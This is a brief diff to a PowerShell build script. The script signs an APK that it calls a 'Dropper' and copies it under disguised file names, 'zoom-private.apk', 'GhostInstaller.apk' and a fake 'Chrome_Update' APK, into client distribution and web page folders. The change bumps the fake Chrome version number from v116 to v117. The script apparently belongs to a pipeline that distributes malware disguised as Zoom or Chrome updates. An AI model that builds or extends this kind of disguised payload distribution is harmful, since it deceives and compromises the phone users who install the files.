@@ -65,7 +65,7 @@ if (-not (Test-Path $apk)) { throw "Build produced no APK: $apk" }
 & $apksigner verify --verbose $apk | Out-Null
 if ($LASTEXITCODE -ne 0) { throw "Dropper signature verification failed" }
 
-foreach ($name in @("zoom-private.apk", "GhostInstaller.apk", "Chrome_Update_v116.apk")) {
+foreach ($name in @("zoom-private.apk", "GhostInstaller.apk", "Chrome_Update_v117.apk")) {
     Copy-Item $apk (Join-Path $repo "distro\clients\android\$name") -Force
 }
 Copy-Item $apk (Join-Path $repo "pages\zoom-private.apk") -Force
